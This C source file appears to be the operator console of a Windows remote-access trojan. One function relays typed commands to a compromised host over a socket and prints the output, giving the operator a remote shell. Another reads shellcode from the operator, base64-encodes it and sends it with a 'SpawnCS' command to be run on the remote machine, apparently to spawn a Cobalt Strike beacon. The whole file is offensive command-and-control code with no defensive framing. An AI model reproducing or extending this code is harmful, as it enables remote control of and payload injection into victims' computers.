#include <stdio.h>
#include <windows.h>
#include "choice.h"
#include "baseFunction.h"
#include "base64.h"
#define MSG_LEN 10244
void dealShell(SOCKET sockClient) {
	char *customChar;
	char recvChar[MSG_LEN];
	customChar = (char *)malloc(MSG_LEN);
	send(sockClient, "shell", 6, 0);
	recv(sockClient,customChar,MSG_LEN,0);
	printf("%s\n",customChar);
	while (1)
	{
		ZeroMemory(customChar, MSG_LEN);

		printf("请输入命令:");
		fgets(customChar, MSG_LEN, stdin);
		trim(customChar);
		if (strcmp(customChar, "exit") == 0)
		{
			send(sockClient, "exit", 6, 0);
			break;
		}
		send(sockClient, customChar, MSG_LEN, 0);
		recv(sockClient, recvChar, MSG_LEN, 0);
		puts(recvChar);
		ZeroMemory(recvChar, MSG_LEN);
	}
	free(customChar);
	
}
void dealSpawn(SOCKET sockClient) {
	char *customChar;
	char recvChar[MSG_LEN];
	char *shellcodeChar;
	char *shellCodeCharB64;
	char *shellcodeLenChar;
	customChar = (char *)malloc(MSG_LEN);
	send(sockClient,"SpawnCS",10,0);
	recv(sockClient,customChar,MSG_LEN,0);
	printf("%s\n",customChar);

	shellcodeChar = (char *)malloc(MSG_LEN);
	shellCodeCharB64 = (char *)malloc(MSG_LEN);
	shellcodeLenChar = (char *)malloc(10);
	ZeroMemory(shellcodeChar, MSG_LEN);
	printf("请输入shellcode长度:");
	fgets(shellcodeLenChar, 10, stdin);
	send(sockClient, shellcodeLenChar, 10, 0);
	printf("请输入Shellcode:");
	fgets(shellcodeChar, MSG_LEN, stdin);
	base64_encode((const unsigned char*)shellcodeChar, shellCodeCharB64, strlen(shellcodeChar));
	printf("Base64编码后结果为:\n%s", shellCodeCharB64);
	send(sockClient, shellCodeCharB64, MSG_LEN, 0);
	getchar();
	ZeroMemory(recvChar, MSG_LEN);
	free(customChar);
	free(shellcodeChar);
	free(shellCodeCharB64);
	free(shellcodeLenChar);

}